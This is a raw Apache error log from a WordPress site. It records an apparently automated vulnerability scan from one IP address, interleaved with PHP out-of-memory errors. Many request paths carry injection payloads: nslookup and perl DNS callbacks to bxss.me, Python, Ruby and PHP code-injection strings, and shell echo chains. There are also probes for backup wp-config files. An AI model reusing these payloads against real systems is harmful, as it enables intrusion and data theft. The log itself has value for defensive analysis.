[Thu Jul 08 01:16:35.174139 2021] [php7:error] [pid 7403] [client 27.147.202.214:9689] PHP Fatal error:  Out of memory (allocated 73400320) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/fusion-builder/shortcodes/fusion-image.php on line 484
[Thu Jul 08 01:16:35.274359 2021] [php7:error] [pid 7273] [client 27.147.202.214:9680] PHP Fatal error:  Out of memory (allocated 94371840) (tried to allocate 20480 bytes) in /var/www/html/bubandcompany.com/wp-content/themes/Avada/includes/options/extra.php on line 917
[Thu Jul 08 01:16:35.298833 2021] [php7:error] [pid 7273] [client 27.147.202.214:9680] PHP Fatal error:  Out of memory (allocated 94371840) (tried to allocate 20480 bytes) in /var/www/html/bubandcompany.com/wp-includes/class-wp-hook.php on line 276
[Thu Jul 08 01:16:36.206359 2021] [php7:error] [pid 7509] [client 27.147.202.214:7360] script '/var/www/html/bubandcompany.com/wp-admin/response.write(9161099*9422551).php' not found or unable to stat
[Thu Jul 08 01:16:36.267148 2021] [php7:error] [pid 7413] [client 27.147.202.214:7358] script '/var/www/html/bubandcompany.com/wp-admin/).php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:16:36.427682 2021] [php7:error] [pid 7277] [client 27.147.202.214:7349] script '/var/www/html/bubandcompany.com/wp-admin/'.gethostbyname(lc('hitii'.'yslxmbhnd3b5f.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(112).chr(75).chr(115).chr(83).'.php' not found or unable to stat
[Thu Jul 08 01:16:36.512954 2021] [php7:error] [pid 7509] [client 27.147.202.214:7360] script '/var/www/html/bubandcompany.com/wp-admin/'+response.write(9161099*9422551)+'.php' not found or unable to stat
[Thu Jul 08 01:16:36.573794 2021] [php7:error] [pid 7413] [client 27.147.202.214:7358] script '/var/www/html/bubandcompany.com/wp-admin/!(()&&!|*|*|.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:16:36.730792 2021] [php7:error] [pid 7398] [client 27.147.202.214:7351] script '/var/www/html/bubandcompany.com/wp-admin/str(__import__('time').sleep(9))+__import__('socket').gethostbyname('hitlkbcvdgewb5ab05.'+'bxss.me').php' not found or unable to stat
[Thu Jul 08 01:16:36.828719 2021] [php7:error] [pid 7509] [client 27.147.202.214:7360] script '/var/www/html/bubandcompany.com/wp-admin/"+response.write(9161099*9422551)+".php' not found or unable to stat
[Thu Jul 08 01:16:36.847205 2021] [php7:error] [pid 7518] [client 27.147.202.214:7356] script '/var/www/html/bubandcompany.com/wp-admin/;assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));.php' not found or unable to stat
[Thu Jul 08 01:16:36.891657 2021] [php7:error] [pid 7413] [client 27.147.202.214:7358] script '/var/www/html/bubandcompany.com/wp-admin/^(#$!@#$)(()))******.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:16:37.052926 2021] [php7:error] [pid 7398] [client 27.147.202.214:7351] script '/var/www/html/bubandcompany.com/wp-admin/'+str(__import__("time").sleep(9))+__import__("socket").gethostbyname("hitlkbcvdgewb5ab05."+"bxss.me")+'.php' not found or unable to stat
[Thu Jul 08 01:16:37.178392 2021] [php7:error] [pid 7518] [client 27.147.202.214:7356] script '/var/www/html/bubandcompany.com/wp-admin/';print(md5(31337));$a='.php' not found or unable to stat
[Thu Jul 08 01:16:38.101732 2021] [php7:error] [pid 7518] [client 27.147.202.214:7356] script '/var/www/html/bubandcompany.com/wp-admin/";print(md5(31337));$a=".php' not found or unable to stat
[Thu Jul 08 01:16:38.191632 2021] [php7:error] [pid 7381] [client 27.147.202.214:7353] script '/var/www/html/bubandcompany.com/wp-admin/"+str(__import__('time').sleep(9))+__import__('socket').gethostbyname('hitlkbcvdgewb5ab05.'+'bxss.me')+".php' not found or unable to stat
[Thu Jul 08 01:16:38.432858 2021] [php7:error] [pid 7436] [client 27.147.202.214:9702] PHP Fatal error:  Out of memory (allocated 81788928) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/wordpress-seo/src/integrations/third-party/elementor.php on line 396
[Thu Jul 08 01:16:38.476636 2021] [php7:error] [pid 7510] [client 27.147.202.214:7350] script '/var/www/html/bubandcompany.com/wp-admin/"+"A".concat(70-3).concat(22*4).concat(119).concat(77).concat(117).concat(81)+(require"socket"\nSocket.gethostbyname("hituv"+"uqmbgjrz817f0.bxss.me.")[3].to_s)+".php' not found or unable to stat
[Thu Jul 08 01:16:38.495169 2021] [php7:error] [pid 7436] [client 27.147.202.214:9702] PHP Fatal error:  Out of memory (allocated 81788928) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/wordpress-seo/lib/model.php on line 1
[Thu Jul 08 01:16:38.565917 2021] [php7:error] [pid 7413] [client 27.147.202.214:7358] script '/var/www/html/bubandcompany.com/wp-admin/))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))).php' not found or unable to stat
[Thu Jul 08 01:16:39.420543 2021] [php7:error] [pid 7518] [client 27.147.202.214:7356] script '/var/www/html/bubandcompany.com/wp-admin/1I7abDnO.php' not found or unable to stat
[Thu Jul 08 01:16:39.821236 2021] [php7:error] [pid 7518] [client 27.147.202.214:7356] script '/var/www/html/bubandcompany.com/wp-admin/'".php' not found or unable to stat
[Thu Jul 08 01:16:40.065877 2021] [php7:error] [pid 7411] [client 27.147.202.214:7685] script '/var/www/html/bubandcompany.com/wp-admin/'+'A'.concat(70-3).concat(22*4).concat(108).concat(89).concat(112).concat(74)+(require'socket'\nSocket.gethostbyname('hitjy'+'mkcvmvmi1398c.bxss.me.')[3].to_s)+'.php' not found or unable to stat
[Thu Jul 08 01:16:40.723325 2021] [php7:error] [pid 7518] [client 27.147.202.214:7356] script '/var/www/html/bubandcompany.com/wp-admin/<!--.php' not found or unable to stat
[Thu Jul 08 01:16:41.104607 2021] [php7:error] [pid 7398] [client 27.147.202.214:7351] PHP Fatal error:  Out of memory (allocated 2097152) (tried to allocate 12288 bytes) in /var/www/html/bubandcompany.com/wp-includes/script-loader.php on line 223, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:16:41.104571 2021] [php7:error] [pid 7242] [client 27.147.202.214:7228] PHP Fatal error:  Out of memory (allocated 6291456) (tried to allocate 8192 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/woocommerce/packages/woocommerce-blocks/src/Domain/Services/DraftOrders.php on line 52, referer: https://www.bubandcompany.com/wp-admin/update-core.php
[Thu Jul 08 01:16:41.210763 2021] [php7:error] [pid 7510] [client 27.147.202.214:7350] PHP Fatal error:  Out of memory (allocated 10485760) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-includes/comment.php on line 2013
[Thu Jul 08 01:16:41.212264 2021] [php7:error] [pid 7242] [client 27.147.202.214:7228] PHP Fatal error:  Out of memory (allocated 6291456) (tried to allocate 20480 bytes) in /var/www/html/bubandcompany.com/wp-includes/option.php on line 456, referer: https://www.bubandcompany.com/wp-admin/update-core.php
[Thu Jul 08 01:16:41.349187 2021] [negotiation:error] [pid 7411] [client 27.147.202.214:7685] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/bubandcompany.com/wp-login (None could be negotiated).
[Thu Jul 08 01:16:41.367984 2021] [php7:error] [pid 7277] [client 27.147.202.214:7349] PHP Fatal error:  Out of memory (allocated 18874368) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/jetpack/_inc/lib/class.core-rest-api-endpoints.php on line 2591
[Thu Jul 08 01:16:41.418753 2021] [php7:error] [pid 7394] [client 27.147.202.214:7362] script '/var/www/html/bubandcompany.com/wp-admin/bxss.me.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:16:41.422079 2021] [php7:error] [pid 7269] [client 27.147.202.214:9699] PHP Fatal error:  Out of memory (allocated 33554432) (tried to allocate 12288 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/fusion-builder/inc/helpers.php on line 365
[Thu Jul 08 01:16:42.224058 2021] [autoindex:error] [pid 7410] [client 27.147.202.214:7531] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 01:16:42.244753 2021] [php7:error] [pid 7413] [client 27.147.202.214:7358] script '/var/www/html/bubandcompany.com/wp-admin/install9439766.php' not found or unable to stat, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:16:45.375157 2021] [negotiation:error] [pid 7447] [client 27.147.202.214:3700] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/bubandcompany.com/xmlrpc (None could be negotiated).
[Thu Jul 08 01:16:48.250882 2021] [php7:error] [pid 7455] [client 27.147.202.214:3698] PHP Fatal error:  Out of memory (allocated 31457280) (tried to allocate 65536 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/wordpress-seo/src/config/migration-status.php on line 10, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:16:48.265142 2021] [php7:error] [pid 7455] [client 27.147.202.214:3698] PHP Fatal error:  Out of memory (allocated 31457280) (tried to allocate 65536 bytes) in Unknown on line 0, referer: https://www.bubandcompany.com/
[Thu Jul 08 01:16:48.299027 2021] [php7:error] [pid 7519] [client 27.147.202.214:5576] PHP Fatal error:  Out of memory (allocated 14680064) (tried to allocate 8192 bytes) in /var/www/html/bubandcompany.com/wp-includes/rest-api/endpoints/class-wp-rest-users-controller.php on line 301
[Thu Jul 08 01:16:48.552947 2021] [php7:error] [pid 7395] [client 27.147.202.214:7488] script '/var/www/html/bubandcompany.com/wp-admin/".gethostbyname(lc("hitfr"."inojognx1b9a9.bxss.me."))."A".chr(67).chr(hex("58")).chr(122).chr(85).chr(122).chr(85).".php' not found or unable to stat
[Thu Jul 08 01:16:50.758766 2021] [core:error] [pid 6979] (36)File name too long: [client 27.147.202.214:8404] AH00036: access to /;(nslookup hitlspsghoxgha7832.bxss.me||perl -e "gethostbyname('hitlspsghoxgha7832.bxss.me')")|(nslookup hitlspsghoxgha7832.bxss.me||perl -e "gethostbyname('hitlspsghoxgha7832.bxss.me')")&(nslookup hitlspsghoxgha7832.bxss.me||perl -e "gethostbyname('hitlspsghoxgha7832.bxss.me')")/install.php failed (filesystem path '/var/www/html/bubandcompany.com/;(nslookup hitlspsghoxgha7832.bxss.me||perl -e "gethostbyname('hitlspsghoxgha7832.bxss.me')")|(nslookup hitlspsghoxgha7832.bxss.me||perl -e "gethostbyname('hitlspsghoxgha7832.bxss.me')")&(nslookup hitlspsghoxgha7832.bxss.me||perl -e "gethostbyname('hitlspsghoxgha7832.bxss.me')")')
[Thu Jul 08 01:16:51.868029 2021] [php7:error] [pid 7394] [client 27.147.202.214:7362] PHP Fatal error:  Out of memory (allocated 41943040) (tried to allocate 8192 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/jetpack/extensions/blocks/button/button.php on line 120
[Thu Jul 08 01:16:53.565631 2021] [php7:error] [pid 7393] [client 27.147.202.214:7675] script '/var/www/html/bubandcompany.com/installer-backup.php' not found or unable to stat
[Thu Jul 08 01:16:54.553277 2021] [php7:error] [pid 7415] [client 27.147.202.214:7361] PHP Fatal error:  Out of memory (allocated 2097152) (tried to allocate 8192 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/jetpack/class.jetpack-admin.php on line 376
[Thu Jul 08 01:16:54.609137 2021] [php7:error] [pid 7524] [client 27.147.202.214:3465] script '/var/www/html/bubandcompany.com/wp-admin/echo xvolrl$()\\ dbafba\\nz^xyu||a #' &echo xvolrl$()\\ dbafba\\nz^xyu||a #|" &echo xvolrl$()\\ dbafba\\nz^xyu||a #.php' not found or unable to stat
[Thu Jul 08 01:16:54.788729 2021] [php7:error] [pid 7381] [client 27.147.202.214:7353] PHP Fatal error:  Out of memory (allocated 2097152) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/fusion-builder/shortcodes/fusion-social-links.php on line 655
[Thu Jul 08 01:16:54.941941 2021] [php7:error] [pid 7381] [client 27.147.202.214:7353] PHP Fatal error:  Out of memory (allocated 2097152) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/woocommerce/includes/log-handlers/class-wc-log-handler-file.php on line 1
[Thu Jul 08 01:16:55.196097 2021] [php7:error] [pid 7511] [client 27.147.202.214:7363] PHP Fatal error:  Out of memory (allocated 81788928) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/fusion-builder/shortcodes/fusion-social-links.php on line 655
[Thu Jul 08 01:16:55.250181 2021] [php7:error] [pid 7447] [client 27.147.202.214:3700] PHP Fatal error:  Out of memory (allocated 23068672) (tried to allocate 65536 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/woocommerce/includes/blocks/class-wc-blocks-utils.php on line 55
[Thu Jul 08 01:16:55.279584 2021] [php7:error] [pid 7447] [client 27.147.202.214:3700] PHP Fatal error:  Out of memory (allocated 23068672) (tried to allocate 65536 bytes) in Unknown on line 0
[Thu Jul 08 01:16:55.329803 2021] [php7:error] [pid 7422] [client 27.147.202.214:5578] PHP Fatal error:  Out of memory (allocated 44040192) (tried to allocate 20480 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/jetpack/modules/protect.php on line 867
[Thu Jul 08 01:16:55.329121 2021] [php7:error] [pid 7512] [client 27.147.202.214:7359] PHP Fatal error:  Out of memory (allocated 60817408) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/wordpress-seo/inc/sitemaps/class-sitemaps.php on line 496
[Thu Jul 08 01:16:55.347477 2021] [php7:error] [pid 7422] [client 27.147.202.214:5578] PHP Fatal error:  Out of memory (allocated 44040192) (tried to allocate 20480 bytes) in /var/www/html/bubandcompany.com/wp-includes/plugin.php on line 188
[Thu Jul 08 01:16:55.354187 2021] [php7:error] [pid 7399] [client 27.147.202.214:8386] script '/var/www/html/bubandcompany.com/wp-admin/&echo zwvkor$()\\ bdlbim\\nz^xyu||a #' &echo zwvkor$()\\ bdlbim\\nz^xyu||a #|" &echo zwvkor$()\\ bdlbim\\nz^xyu||a #.php' not found or unable to stat
[Thu Jul 08 01:16:55.365574 2021] [php7:error] [pid 7413] [client 27.147.202.214:7358] PHP Fatal error:  Out of memory (allocated 25165824) (tried to allocate 65536 bytes) in /var/www/html/bubandcompany.com/wp-content/themes/Avada/includes/class-avada-avadaredux-migration.php on line 23
[Thu Jul 08 01:16:55.365803 2021] [php7:error] [pid 7413] [client 27.147.202.214:7358] PHP Fatal error:  Out of memory (allocated 25165824) (tried to allocate 65536 bytes) in /var/www/html/bubandcompany.com/wp-includes/class-wp-fatal-error-handler.php on line 52
[Thu Jul 08 01:16:55.366228 2021] [php7:error] [pid 7518] [client 27.147.202.214:7356] PHP Fatal error:  Out of memory (allocated 67108864) (tried to allocate 65536 bytes) in /var/www/html/bubandcompany.com/wp-content/themes/Avada/includes/class-avada-avadaredux-migration.php on line 770
[Thu Jul 08 01:16:55.366480 2021] [php7:error] [pid 7518] [client 27.147.202.214:7356] PHP Fatal error:  Out of memory (allocated 67108864) (tried to allocate 65536 bytes) in /var/www/html/bubandcompany.com/wp-includes/class-wp-fatal-error-handler.php on line 80
[Thu Jul 08 01:16:55.674940 2021] [php7:error] [pid 7399] [client 27.147.202.214:8386] script '/var/www/html/bubandcompany.com/wp-admin/|echo zwerfy$()\\ pbvkqi\\nz^xyu||a #' |echo zwerfy$()\\ pbvkqi\\nz^xyu||a #|" |echo zwerfy$()\\ pbvkqi\\nz^xyu||a #.php' not found or unable to stat
[Thu Jul 08 01:16:55.995223 2021] [php7:error] [pid 7399] [client 27.147.202.214:8386] script '/var/www/html/bubandcompany.com/wp-admin/(nslookup hitzbzvnajothba814.bxss.me||perl -e "gethostbyname('hitzbzvnajothba814.bxss.me')").php' not found or unable to stat
[Thu Jul 08 01:16:56.085696 2021] [php7:error] [pid 7452] [client 27.147.202.214:7354] script '/var/www/html/bubandcompany.com/bak.wp-config.php' not found or unable to stat
[Thu Jul 08 01:17:00.188083 2021] [php7:error] [pid 7452] [client 27.147.202.214:7354] script '/var/www/html/bubandcompany.com/old.wp-config.php' not found or unable to stat
[Thu Jul 08 01:17:00.612979 2021] [negotiation:error] [pid 7392] [client 27.147.202.214:11706] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/bubandcompany.com/xmlrpc (None could be negotiated).
[Thu Jul 08 01:17:01.408719 2021] [negotiation:error] [pid 7410] [client 27.147.202.214:7531] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/bubandcompany.com/xmlrpc (None could be negotiated).
[Thu Jul 08 01:17:02.054143 2021] [php7:error] [pid 7242] [client 27.147.202.214:11735] script '/var/www/html/bubandcompany.com/wp-admin/$(nslookup hitfonxxrbbpzfccab.bxss.me||perl -e "gethostbyname('hitfonxxrbbpzfccab.bxss.me')").php' not found or unable to stat
[Thu Jul 08 01:17:05.560045 2021] [php7:error] [pid 7392] [client 27.147.202.214:11706] script '/var/www/html/bubandcompany.com/wp-admin/&(nslookup hitqqpnkigeup147c7.bxss.me||perl -e "gethostbyname('hitqqpnkigeup147c7.bxss.me')")&'\\"`0&(nslookup hitqqpnkigeup147c7.bxss.me||perl -e "gethostbyname('hitqqpnkigeup147c7.bxss.me')")&`'.php' not found or unable to stat
[Thu Jul 08 01:17:07.851139 2021] [php7:error] [pid 7242] [client 27.147.202.214:11735] script '/var/www/html/bubandcompany.com/soap.php' not found or unable to stat
[Thu Jul 08 01:17:07.926943 2021] [autoindex:error] [pid 7392] [client 27.147.202.214:11706] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 01:17:08.279375 2021] [autoindex:error] [pid 7391] [client 27.147.202.214:7686] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 01:17:08.768306 2021] [php7:error] [pid 7401] [client 27.147.202.214:7681] script '/var/www/html/bubandcompany.com/soap.php' not found or unable to stat
[Thu Jul 08 01:17:09.267678 2021] [php7:error] [pid 7242] [client 27.147.202.214:11735] script '/var/www/html/bubandcompany.com/wp-admin/css/apc.php' not found or unable to stat
[Thu Jul 08 01:17:09.761159 2021] [php7:error] [pid 6979] [client 27.147.202.214:8404] PHP Fatal error:  Out of memory (allocated 75497472) (tried to allocate 32768 bytes) in /var/www/html/bubandcompany.com/wp-content/plugins/wordpress-seo/src/integrations/third-party/elementor.php on line 396
[Thu Jul 08 01:17:09.999625 2021] [php7:error] [pid 7401] [client 27.147.202.214:7681] script '/var/www/html/bubandcompany.com/soap.php' not found or unable to stat
[Thu Jul 08 01:17:10.656174 2021] [php7:error] [pid 7401] [client 27.147.202.214:7681] script '/var/www/html/bubandcompany.com/soap.php' not found or unable to stat
[Thu Jul 08 01:17:11.368978 2021] [php7:error] [pid 7401] [client 27.147.202.214:7681] script '/var/www/html/bubandcompany.com/xmlrpc-server.php' not found or unable to stat
